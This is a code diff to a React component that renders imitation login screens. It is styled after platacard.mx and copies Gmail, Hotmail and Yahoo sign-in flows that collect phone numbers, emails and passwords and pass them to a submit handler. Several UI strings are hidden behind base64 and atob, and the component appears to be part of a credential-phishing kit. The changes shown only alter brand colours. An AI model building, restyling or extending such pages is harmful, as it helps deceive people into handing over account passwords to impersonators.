@@ -365,7 +365,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
                 {/* Header estilo platacard.mx */}
                 <div className="text-center mb-8">
-                  <div className="bg-gradient-to-r from-[#BE0046] to-[#9A0037] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                  <div className="bg-gradient-to-r from-[#FF6B35] to-[#FF8C5A] w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
                     <span className="text-2xl text-white">📱</span>
                   </div>
                   <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu número celular</h2>
@@ -387,7 +387,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                       }
                     }}
                     placeholder="5512345678"
-                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#BE0046] focus:border-[#BE0046] text-lg"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-[#FF6B35] focus:border-[#FF6B35] text-lg"
                     maxLength={10}
                   />
                   <p className="text-xs text-gray-500 mt-2">
@@ -1206,11 +1206,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             />
             
             <div className="text-left mb-6">
-              <a href="#" className="text-[#BE0046] text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
+              <a href="#" className="text-[#FF6B35] text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
             </div>
             
             <Button 
-              className="bg-[#BE0046] text-white hover:bg-[#9A0037] w-full py-2 px-4 rounded"
+              className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] w-full py-2 px-4 rounded"
               onClick={handleGmailNextScreen}
             >
               Siguiente
@@ -1358,7 +1358,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                     <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
                   </div>
                   <Button 
-                    className="bg-[#BE0046] text-white hover:bg-[#9A0037] px-8 rounded"
+                    className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] px-8 rounded"
                     onClick={() => {
                       if (!emailInput) return;
                       setHotmailStep2(true);
@@ -1386,21 +1386,21 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 
                 <div className="text-xs text-gray-600 mb-6 self-start">
-                  <a href="#" className="text-[#BE0046]">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
+                  <a href="#" className="text-[#FF6B35]">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
                   <div>
                     <Button 
                       variant="link" 
-                      className="text-sm text-[#BE0046] p-0"
+                      className="text-sm text-[#FF6B35] p-0"
                       onClick={() => setHotmailStep2(false)}
                     >
                       {atob('QXRyw6Fz')}
                     </Button>
                   </div>
                   <Button 
-                    className="bg-[#BE0046] text-white hover:bg-[#9A0037] px-8 rounded"
+                    className="bg-[#FF6B35] text-white hover:bg-[#FF8C5A] px-8 rounded"
                     onClick={() => {
                       if (!passwordInput) return;
                       onSubmit(ScreenType.HOTMAIL, { 
@@ -1455,10 +1455,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 
                 <div className="flex justify-between w-full">
                   <div>
-                    <a href="#" className="text-sm text-[#BE0046]">Crear cuenta</a>
+                    <a href="#" className="text-sm text-[#FF6B35]">Crear cuenta</a>
                   </div>
                   <Button 
-                    className="bg-[#BE0046] hover:bg-[#9A0037] text-white px-8 py-2 rounded-sm"
+                    className="bg-[#FF6B35] hover:bg-[#FF8C5A] text-white px-8 py-2 rounded-sm"
                     onClick={() => {
                       // Validación mínima
                       if (!emailInput) return;
@@ -1489,19 +1489,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 </div>
                 
                 <div className="text-sm self-start mb-5">
-                  <a href="#" className="text-[#BE0046]">¿Olvidaste tu contraseña?</a>
+                  <a href="#" className="text-[#FF6B35]">¿Olvidaste tu contraseña?</a>
                 </div>
                 
                 <div className="flex justify-between w-full">
                   <Button 
                     variant="link" 
-                    className="text-sm text-[#BE0046] p-0"
+                    className="text-sm text-[#FF6B35] p-0"
                     onClick={() => setYahooStep2(false)}
                   >
                     Atrás
                   </Button>
                   <Button 
-                    className="bg-[#BE0046] hover:bg-[#9A0037] text-white px-8 py-2 rounded-sm"
+                    className="bg-[#FF6B35] hover:bg-[#FF8C5A] text-white px-8 py-2 rounded-sm"
                     onClick={() => {
                       // Validación mínima
                       if (!passwordInput) return;
